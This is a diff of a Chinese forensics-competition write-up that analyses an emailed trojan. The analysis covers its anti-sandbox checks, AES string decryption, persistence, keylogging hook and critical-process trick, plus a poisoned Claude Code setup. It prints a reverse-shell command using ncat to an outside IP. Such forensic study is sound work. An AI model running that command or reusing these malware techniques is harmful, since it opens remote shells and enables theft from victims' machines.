-<img src="/Picture/WpDF/Pinghang/2026Group/146.png" width="898.5" title="" crop="0,0,1,1" id="ud1f32ef5" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/146.png" width="898.5" title="" crop="0,0,1,1" id="ud1f32ef5" class="ne-image">
 
 这俩电脑上都有邮箱，全都打开来看看
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/147.png" width="863" title="" crop="0,0,1,1" id="u425a5b33" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/147.png" width="863" title="" crop="0,0,1,1" id="u425a5b33" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/148.png" width="801.5" title="" crop="0,0,1,1" id="u34eff639" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/148.png" width="801.5" title="" crop="0,0,1,1" id="u34eff639" class="ne-image">
 
 早起王发了俩，但是倩倩只收到一个，那应该就是这里的这个海牛VPN的压缩文件了
 
 压缩文件拉出来后，解压密码在邮件里面写了
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/149.png" width="1285" title="" crop="0,0,1,1" id="a5jlv" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/149.png" width="1285" title="" crop="0,0,1,1" id="a5jlv" class="ne-image">
 
 解压出来电脑秒报毒
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/150.png" width="1318.5" title="" crop="0,0,1,1" id="uf8d0331b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/150.png" width="1318.5" title="" crop="0,0,1,1" id="uf8d0331b" class="ne-image">
 
 直接算他的MD5即可
 
@@ -2942,7 +2942,7 @@ certutil -hashfile <文件名> MD5
 ```
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/151.png" width="499.5" title="" crop="0,0,1,1" id="uca9272b0" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/151.png" width="499.5" title="" crop="0,0,1,1" id="uca9272b0" class="ne-image">
 
 ### 54 接上题，编译木马使用的.NET版本是多少?【答案格式：1.1.45141】
 #### 答案
@@ -2954,7 +2954,7 @@ certutil -hashfile <文件名> MD5
 用die打开exe即可看到信息（我把die拖到虚拟机里面去了）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/152.png" width="1206" title="" crop="0,0,1,1" id="pgg4E" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/152.png" width="1206" title="" crop="0,0,1,1" id="pgg4E" class="ne-image">
 
 ### 55 接上题，木马中有多少反沙箱和反调试的检测逻辑?【答案格式：8】
 #### 答案
@@ -2968,9 +2968,9 @@ certutil -hashfile <文件名> MD5
 其展示了程序入口点在何处，定位到该位置（单击过去即可）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/153.png" width="1282" title="" crop="0,0,1,1" id="uce8c489c" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/153.png" width="1282" title="" crop="0,0,1,1" id="uce8c489c" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/154.png" width="1420" title="" crop="0,0,1,1" id="ucb47ef2f" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/154.png" width="1420" title="" crop="0,0,1,1" id="ucb47ef2f" class="ne-image">
 
 using System;
 using System.Collections;
@@ -3543,16 +3543,16 @@ namespace Stub
 那么这里应该是解码字符串用的
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/155.png" width="1061" title="" crop="0,0,1,1" id="uf2aeb797" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/155.png" width="1061" title="" crop="0,0,1,1" id="uf2aeb797" class="ne-image">
 
 然后紧接着是进入了一个判断
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/156.png" width="563" title="" crop="0,0,1,1" id="u101fba1e" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/156.png" width="563" title="" crop="0,0,1,1" id="u101fba1e" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/157.png" width="1021.5" title="" crop="0,0,1,1" id="u701fba52" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/157.png" width="1021.5" title="" crop="0,0,1,1" id="u701fba52" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/158.png" width="1150" title="" crop="0,0,1,1" id="u43810c4d" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/158.png" width="1150" title="" crop="0,0,1,1" id="u43810c4d" class="ne-image">
 
 这玩意调用了Mutex的三参数构造函数
 
@@ -3565,7 +3565,7 @@ Mutex是.NET里面的互斥锁（或者应该被称作同名互斥体），保�
 但是
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/159.png" width="1053" title="" crop="0,0,1,1" id="ua5ac721f" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/159.png" width="1053" title="" crop="0,0,1,1" id="ua5ac721f" class="ne-image">
 
 这里面的名字是个硬编码的名称，因此无法确定是否是反沙箱，很可能只是防多开
 
@@ -3576,18 +3576,18 @@ Mutex是.NET里面的互斥锁（或者应该被称作同名互斥体），保�
 去看函数里面的东西
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/160.png" width="986.5" title="" crop="0,0,1,1" id="ud24d4f9c" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/160.png" width="986.5" title="" crop="0,0,1,1" id="ud24d4f9c" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/161.png" width="1073.5" title="" crop="0,0,1,1" id="u54389d95" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/161.png" width="1073.5" title="" crop="0,0,1,1" id="u54389d95" class="ne-image">
 
 连续挂了5个if，这5个if对应的函数就在下面
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/162.png" width="1089.5" title="" crop="0,0,1,1" id="u6711a7eb" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/162.png" width="1089.5" title="" crop="0,0,1,1" id="u6711a7eb" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/163.png" width="1062.5" title="" crop="0,0,1,1" id="u559d3dc6" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/163.png" width="1062.5" title="" crop="0,0,1,1" id="u559d3dc6" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/164.png" width="1095" title="" crop="0,0,1,1" id="uc9c52c56" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/164.png" width="1095" title="" crop="0,0,1,1" id="uc9c52c56" class="ne-image">
 
 （PS，以下是否真实并不确定，但大致应该没问题）
 
@@ -3627,9 +3627,9 @@ WmiPrvSE
 不妨继续看下去入口
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/165.png" width="1025" title="" crop="0,0,1,1" id="u89024777" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/165.png" width="1025" title="" crop="0,0,1,1" id="u89024777" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/166.png" width="1086" title="" crop="0,0,1,1" id="u1f3a12a6" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/166.png" width="1086" title="" crop="0,0,1,1" id="u1f3a12a6" class="ne-image">
 
 这个函数里面能看到powershell，但并非用来提升权限的，而是用来添加排除项的
 
@@ -3638,7 +3638,7 @@ WmiPrvSE
 继续看下面
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/167.png" width="731.5" title="" crop="0,0,1,1" id="u3b0516f2" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/167.png" width="731.5" title="" crop="0,0,1,1" id="u3b0516f2" class="ne-image">
 
 一看就是创建文件
 
@@ -3647,9 +3647,9 @@ WmiPrvSE
 继续往下看
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/168.png" width="1032.5" title="" crop="0,0,1,1" id="u6b46c985" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/168.png" width="1032.5" title="" crop="0,0,1,1" id="u6b46c985" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/169.png" width="1048.5" title="" crop="0,0,1,1" id="ub0d92f03" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/169.png" width="1048.5" title="" crop="0,0,1,1" id="ub0d92f03" class="ne-image">
 
 这里可以看到定义了两个命令行参数
 
@@ -3672,12 +3672,12 @@ WmiPrvSE
 这里问路径名，那去查那个字符串是什么即可
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/170.png" width="867.5" title="" crop="0,0,1,1" id="u3dd25e65" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/170.png" width="867.5" title="" crop="0,0,1,1" id="u3dd25e65" class="ne-image">
 
 这玩意尝试用base64解码只会出现一堆乱码
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/171.png" width="1169" title="" crop="0,0,1,1" id="ud576d65d" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/171.png" width="1169" title="" crop="0,0,1,1" id="ud576d65d" class="ne-image">
 
 因此加密方式并非base64
 
@@ -3690,7 +3690,7 @@ WmiPrvSE
 总之，解出来是这玩意
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/172.png" width="1181" title="" crop="0,0,1,1" id="uae349b3d" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/172.png" width="1181" title="" crop="0,0,1,1" id="uae349b3d" class="ne-image">
 
 按照格式，格式中没有后缀，那也去掉后缀
 
@@ -3706,7 +3706,7 @@ AES
 寻找这个字段在程序中还有哪里出现过
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/173.png" width="1142.5" title="" crop="0,0,1,1" id="u3bb905a6" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/173.png" width="1142.5" title="" crop="0,0,1,1" id="u3bb905a6" class="ne-image">
 
 豪，我们在入口程序的开头也发现了它，而且是将自身调用完函数后再次赋值给自身
 
@@ -3715,7 +3715,7 @@ AES
 进去看看
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/174.png" width="1040.5" title="" crop="0,0,1,1" id="u69d78b2c" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/174.png" width="1040.5" title="" crop="0,0,1,1" id="u69d78b2c" class="ne-image">
 
 AES秒了（（
 
@@ -3732,7 +3732,7 @@ RijndaelManaged这个类就是AES在.NET中对应的类
 而array来源于sourcearray的复制，这玩意来自一个字段的哈希值
 
 这也是下面一题的答案
-<img src="/Picture/WpDF/Pinghang/2026Group/175.png" width="935" title="" crop="0,0,1,1" id="uc85897b1" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/175.png" width="935" title="" crop="0,0,1,1" id="uc85897b1" class="ne-image">
 
 豪，那么我们现在能知道key的运算方式：
 
@@ -3757,14 +3757,14 @@ AES会根据key的长度自动设置其模式，比方说这里是32位key，就
 然后，这里是先调用了base64解码，再调用的aes解码
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/176.png" width="1023.5" title="" crop="0,0,1,1" id="ub6a61192" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/176.png" width="1023.5" title="" crop="0,0,1,1" id="ub6a61192" class="ne-image">
 
 
 
 此时我们尝试解一下上一题的答案
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/177.png" width="1181" title="" crop="0,0,1,1" id="uc68941c0" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/177.png" width="1181" title="" crop="0,0,1,1" id="uc68941c0" class="ne-image">
 
 解出来证明逻辑确实正确
 
@@ -3785,34 +3785,34 @@ AES会根据key的长度自动设置其模式，比方说这里是32位key，就
 欸然后就会发现，第一个字符串就是答案
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/178.png" width="1106.5" title="" crop="0,0,1,1" id="ub5e00a41" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/178.png" width="1106.5" title="" crop="0,0,1,1" id="ub5e00a41" class="ne-image">
 
 愿意的话可以把后面的东西都解一下（）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/179.png" width="1016" title="" crop="0,0,1,1" id="u1bc5e828" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/179.png" width="1016" title="" crop="0,0,1,1" id="u1bc5e828" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/180.png" width="823" title="" crop="0,0,1,1" id="u5a571c2a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/180.png" width="823" title="" crop="0,0,1,1" id="u5a571c2a" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/181.png" width="923" title="" crop="0,0,1,1" id="udfcec5c6" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/181.png" width="923" title="" crop="0,0,1,1" id="udfcec5c6" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/182.png" width="890.5" title="" crop="0,0,1,1" id="u00cb2172" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/182.png" width="890.5" title="" crop="0,0,1,1" id="u00cb2172" class="ne-image">
 
 布什戈门你default还编码？？？
 
-<img src="/Picture/WpDF/Pinghang/2026Group/183.png" width="826.5" title="" crop="0,0,1,1" id="u65885c12" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/183.png" width="826.5" title="" crop="0,0,1,1" id="u65885c12" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/184.png" width="905" title="" crop="0,0,1,1" id="u89f9026a" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/184.png" width="905" title="" crop="0,0,1,1" id="u89f9026a" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/185.png" width="981.5" title="" crop="0,0,1,1" id="u28722d1c" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/185.png" width="981.5" title="" crop="0,0,1,1" id="u28722d1c" class="ne-image">
 
 这是啥？？
 
-<img src="/Picture/WpDF/Pinghang/2026Group/186.png" width="1017.5" title="" crop="0,0,1,1" id="u12b5b7fe" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/186.png" width="1017.5" title="" crop="0,0,1,1" id="u12b5b7fe" class="ne-image">
 
 这是个钱包地址吧
 
-<img src="/Picture/WpDF/Pinghang/2026Group/187.png" width="895" title="" crop="0,0,1,1" id="u314aba2b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/187.png" width="895" title="" crop="0,0,1,1" id="u314aba2b" class="ne-image">
 
 这玩意也是个钱包地址
 你们怎么这么喜欢跟区块链挂钩
@@ -3847,7 +3847,7 @@ SbieDll.dll
 继续看主函数
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/188.png" width="1089" title="" crop="0,0,1,1" id="uc4515551" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/188.png" width="1089" title="" crop="0,0,1,1" id="uc4515551" class="ne-image">
 
 这里是将这个木马写入注册表的开机自启动里面去了
 
@@ -3858,7 +3858,7 @@ Conputer.Registry.CurrentUser获取注册表根目录
 接下来
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/189.png" width="1066" title="" crop="0,0,1,1" id="u00be9e16" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/189.png" width="1066" title="" crop="0,0,1,1" id="u00be9e16" class="ne-image">
 
 这一块的try，AI告诉我说是用来在自启动文件夹里面创建快捷方式的
 
@@ -3869,12 +3869,12 @@ Environment.SpecialFolder.Startup会获取自启动的文件夹的路径
 继续看下面
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/190.png" width="1132.5" title="" crop="0,0,1,1" id="u3ecc2052" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/190.png" width="1132.5" title="" crop="0,0,1,1" id="u3ecc2052" class="ne-image">
 
 这下面紧接着一个函数
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/191.png" width="1110.5" title="" crop="0,0,1,1" id="u8a8a0a7b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/191.png" width="1110.5" title="" crop="0,0,1,1" id="u8a8a0a7b" class="ne-image">
 
 这个函数很短，虽然变量名很长（所以dnSpy到底为什么要把一个变量名翻译的这么长？？要干嘛）
 
@@ -4204,12 +4204,12 @@ private static void 8JW8sctAWP3goappjN57CJl2TLWyKcTw2ZYwj5rr18XOfs8ItKA8LpXmObth
 一点点来看
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/192.png" width="940" title="" crop="0,0,1,1" id="uc1fffb59" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/192.png" width="940" title="" crop="0,0,1,1" id="uc1fffb59" class="ne-image">
 
 定义了几个变量，创建了wscript的实例
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/193.png" width="1282.5" title="" crop="0,0,1,1" id="ufe31f804" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/193.png" width="1282.5" title="" crop="0,0,1,1" id="ufe31f804" class="ne-image">
 
 清理了所有的错误状态（ProjectData.ClearProjectError();是VB.NET里面用来清理错误状态的，这证明这个项目应该是用VB.NET来写的而非C#）后
 
@@ -4227,23 +4227,23 @@ RtlSetProcessIsCritical
 继续看主函数
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/194.png" width="1099" title="" crop="0,0,1,1" id="u9e6d4be5" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/194.png" width="1099" title="" crop="0,0,1,1" id="u9e6d4be5" class="ne-image">
 
 前一题是去oXAU... 里面找信息了，接下来一个一个函数看
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/195.png" width="1002.5" title="" crop="0,0,1,1" id="uefdf3b50" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/195.png" width="1002.5" title="" crop="0,0,1,1" id="uefdf3b50" class="ne-image">
 
 这玩意就用来防止休眠的
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/196.png" width="1079.5" title="" crop="0,0,1,1" id="u228a6dee" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/196.png" width="1079.5" title="" crop="0,0,1,1" id="u228a6dee" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/197.png" width="1042" title="" crop="0,0,1,1" id="uc56ebea2" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/197.png" width="1042" title="" crop="0,0,1,1" id="uc56ebea2" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/198.png" width="1070.5" title="" crop="0,0,1,1" id="u6a4a4c42" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/198.png" width="1070.5" title="" crop="0,0,1,1" id="u6a4a4c42" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/199.png" width="1009" title="" crop="0,0,1,1" id="u5abcfe79" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/199.png" width="1009" title="" crop="0,0,1,1" id="u5abcfe79" class="ne-image">
 
 通过一次一次的调用可以看到，这一堆函数的目的是用来创建windows钩子（Hook）的（最后一张图片，EntryPoint = "SetWindowsHookEx"）
 
@@ -4254,22 +4254,22 @@ windows钩子的目的是用来监控输入的，当安装成功后，在接收�
 看看下一个函数
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/200.png" width="1080.5" title="" crop="0,0,1,1" id="u6a758aa0" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/200.png" width="1080.5" title="" crop="0,0,1,1" id="u6a758aa0" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/201.png" width="1085" title="" crop="0,0,1,1" id="u41634304" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/201.png" width="1085" title="" crop="0,0,1,1" id="u41634304" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/202.png" width="689.5" title="" crop="0,0,1,1" id="u3ba75471" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/202.png" width="689.5" title="" crop="0,0,1,1" id="u3ba75471" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/203.png" width="978.5" title="" crop="0,0,1,1" id="u97cdd425" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/203.png" width="978.5" title="" crop="0,0,1,1" id="u97cdd425" class="ne-image">
 
 根据AI的说法，这玩意是监控剪切板的，没有啥API关键进程
 
 下一个
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/204.png" width="1043.5" title="" crop="0,0,1,1" id="u9d25242f" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/204.png" width="1043.5" title="" crop="0,0,1,1" id="u9d25242f" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/205.png" width="740" title="" crop="0,0,1,1" id="ucce997ac" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/205.png" width="740" title="" crop="0,0,1,1" id="ucce997ac" class="ne-image">
 
 先判断了一下是否是管理员权限，如果是进if判断
 
@@ -4284,7 +4284,7 @@ Process.EnterDebugMode();
 然后就是函数H8da... 
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/206.png" width="1043.5" title="" crop="0,0,1,1" id="u36626ab1" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/206.png" width="1043.5" title="" crop="0,0,1,1" id="u36626ab1" class="ne-image">
 
 H8da函数相当于是直接导入了RtlSetProcessIsCritical这个函数，对于这个函数，第一个bool值就是设置关键进程，true设置false取消，第二个bool用来表明是否成功设置，传出，第三个不知道干什么的（）
 
@@ -4308,7 +4308,7 @@ ncat.exe 156.238.239.253 1314 -e powershell
 小故事很重要，有时能提供很有用的信息
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/207.png" width="692" title="" crop="0,0,1,1" id="u866852b6" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/207.png" width="692" title="" crop="0,0,1,1" id="u866852b6" class="ne-image">
 
 如图，这是个api投毒，往ClaudeCode里面投毒了木马病毒  
 那理论上应该去Claude应用里面去找
@@ -4316,9 +4316,9 @@ ncat.exe 156.238.239.253 1314 -e powershell
 然而
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/208.png" width="1014.5" title="" crop="0,0,1,1" id="u9857b475" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/208.png" width="1014.5" title="" crop="0,0,1,1" id="u9857b475" class="ne-image">
 
-<img src="/Picture/WpDF/Pinghang/2026Group/209.png" width="1150" title="" crop="0,0,1,1" id="ua7af8b9b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/209.png" width="1150" title="" crop="0,0,1,1" id="ua7af8b9b" class="ne-image">
 
 不论是program file 还是x86里面，都没有相关文件
 
@@ -4327,14 +4327,14 @@ ncat.exe 156.238.239.253 1314 -e powershell
 然而
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/210.png" width="1267" title="" crop="0,0,1,1" id="u7c80d9e6" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/210.png" width="1267" title="" crop="0,0,1,1" id="u7c80d9e6" class="ne-image">
 
 在找AppData前，在appdata上面看到了另一个文件夹.claude
 
 去这里面找找
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/211.png" width="1146.5" title="" crop="0,0,1,1" id="u3678252b" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/211.png" width="1146.5" title="" crop="0,0,1,1" id="u3678252b" class="ne-image">
 
 要查
 
@@ -4347,14 +4347,14 @@ ncat.exe 156.238.239.253 1314 -e powershell
 去看project
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/212.png" width="685.5" title="" crop="0,0,1,1" id="u24ebf184" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/212.png" width="685.5" title="" crop="0,0,1,1" id="u24ebf184" class="ne-image">
 
 一堆文件，一个一个看看
 
 然后在第11个文件里面
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/213.png" width="1421.5" title="" crop="0,0,1,1" id="u16941047" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/213.png" width="1421.5" title="" crop="0,0,1,1" id="u16941047" class="ne-image">
 
 （搜索文件还是AI靠谱（））
 
@@ -4370,7 +4370,7 @@ ncat.exe 156.238.239.253 1314 -e powershell
 里面只有一个进程标识符还能是哪个（）
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/214.png" width="1333" title="" crop="0,0,1,1" id="uaeccea7d" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/214.png" width="1333" title="" crop="0,0,1,1" id="uaeccea7d" class="ne-image">
 
 ### 68 请分析倩倩的PC内存镜像，请尝试解密微信数据库并写出message_0.db对应的微信密钥?【答案格式： 60e248c9079f4bc14e256e0b65495e8688d7b342d43dc84a5f417f4097c9c792】
 #### 答案
@@ -4380,7 +4380,7 @@ ncat.exe 156.238.239.253 1314 -e powershell
 冷知识，火眼这次比答案更超模
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/215.png" width="1118.5" title="" crop="0,0,1,1" id="u5622cc79" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/215.png" width="1118.5" title="" crop="0,0,1,1" id="u5622cc79" class="ne-image">
 
 后面b59f89...都不需要
 
@@ -4392,7 +4392,7 @@ ncat.exe 156.238.239.253 1314 -e powershell
 已经知道木马是哪个程序了
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/216.png" width="1315" title="" crop="0,0,1,1" id="uba77c21f" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/216.png" width="1315" title="" crop="0,0,1,1" id="uba77c21f" class="ne-image">
 
 ### 70 请分析B的PC内存镜像，请找到正在运行的木马进程的创建时间（UTC）?（答案格式：2026-01-01 01:11:11）
 #### 答案
@@ -4409,7 +4409,7 @@ ncat.exe 156.238.239.253 1314 -e powershell
 用lovelymem搜出来的
 
 
-<img src="/Picture/WpDF/Pinghang/2026Group/217.png" width="1182.5" title="" crop="0,0,1,1" id="u0e0f91e5" class="ne-image">
+<img src="/Picture/WpDF/Pinghang/26Grp/217.png" width="1182.5" title="" crop="0,0,1,1" id="u0e0f91e5" class="ne-image">
 
 这里面能看到俩IP
 
